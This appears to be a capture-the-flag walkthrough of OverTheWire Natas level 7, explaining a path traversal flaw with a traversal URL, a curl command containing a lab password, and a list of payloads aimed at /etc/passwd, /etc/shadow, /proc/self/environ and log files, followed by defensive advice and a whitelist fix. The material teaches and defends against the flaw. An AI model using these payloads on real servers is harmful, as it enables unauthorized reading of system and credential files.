// Path Traversal — Directory Traversal via URL Parameter

🚀 Crafted by Leo ⚡ GitHub · LinkedIn · Telegram
07 Path Traversal — Directory Traversal Medium

// Key Concepts

Path Traversal Directory Traversal File Disclosure Input Validation ../ (Dot-dot-slash)

// Challenge Overview

This level displays a page with a "Home" link that includes a URL parameter page. The application appears to be reading and displaying files based on this parameter, making it vulnerable to Path Traversal (also known as Directory Traversal).

// Initial Analysis

The URL structure reveals a parameter being used to load content:

http://natas7.natas.labs.overthewire.org/index.php?page=home

Notice the navigation links:

home">Home about">About

This suggests the server is doing something like:

<?php include("pages/" . $_GET['page'] . ".html"); ?>
💡 Path Traversal allows attackers to read files outside the intended directory by using ../ sequences to navigate up the directory tree.

// Understanding Path Traversal

Path Traversal (also known as Directory Traversal or ../ attack) is a vulnerability that occurs when:

  • User input is used to construct file paths
  • No validation or sanitization is performed
  • Special characters like ../ are not filtered
  • Attackers can traverse outside the intended directory

The ../ sequence is used in file systems to move up one directory level. By combining multiple ../ sequences, an attacker can reach any file on the system that the web server has access to.

// Solution Walkthrough

  1. Observe the URL parameter: ?page=home.
  2. Try to read files outside the pages/ directory using ../:
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/passwd
  1. The application includes the file and displays its contents.
  2. Since the password is stored in the file /etc/natas_webpass/natas8, try to access it:
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8
  1. The password is displayed on the page.

Alternative Method — Using curl:

curl -u natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 \ "http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8"

Common Payloads for Testing:

# Linux files often targeted: ../../../etc/passwd ../../../../etc/shadow ../../../../etc/hosts ../../../../proc/self/environ ../../../../var/log/apache2/access.log # Windows files often targeted: ..\..\..\Windows\win.ini ..\..\..\Windows\System32\drivers\etc\hosts

// Why It Works

The vulnerability exists because:

  • No input validation: The page parameter is not sanitized.
  • Path concatenation: The application directly concatenates user input with a base path.
  • No restrictions: There are no checks to prevent traversing outside the intended directory.
  • File system access: The web server has permissions to read the target files.

// The Impact of Path Traversal

  • Sensitive file disclosure: Reading passwords, configuration files, source code
  • Credentials exposure: Accessing files containing usernames and passwords
  • System information: Reading files like /etc/passwd or Windows\win.ini
  • Source code theft: Reading application source code
  • Potential RCE: In combination with file uploads or log poisoning

// Defensive Measures

  • Never use user input directly in file paths.
  • Use a whitelist of allowed values (e.g., ['home', 'about']).
  • If dynamic inclusion is necessary, validate and sanitize all input.
  • Use basename() or realpath() to resolve and validate the final path.
  • Run the web server with limited privileges and restrictive permissions.
  • Implement chroot or virtualization to isolate the web server.
  • Use a chroot jail to restrict the web server's file system access.
  • Consider using a database or configuration file instead of directly reading files from the file system.

// Secure Coding Example

✅ Safe approach (whitelist):

<?php $allowed_pages = ['home', 'about', 'contact']; $page = $_GET['page'] ?? 'home'; if (in_array($page, $allowed_pages)) { include("pages/" . $page . ".html"); } else { include("pages/404.html"); } ?>

⚠️ Never do this: include("pages/" . $_GET['page'] . ".html");

// Key Takeaways

🔍 Beware of ../

User input containing ../ sequences can traverse outside the intended directory. Always validate and sanitize.

📋 Whitelist Is the Way

Using a whitelist of allowed values is the simplest and most secure approach to dynamic file inclusion.
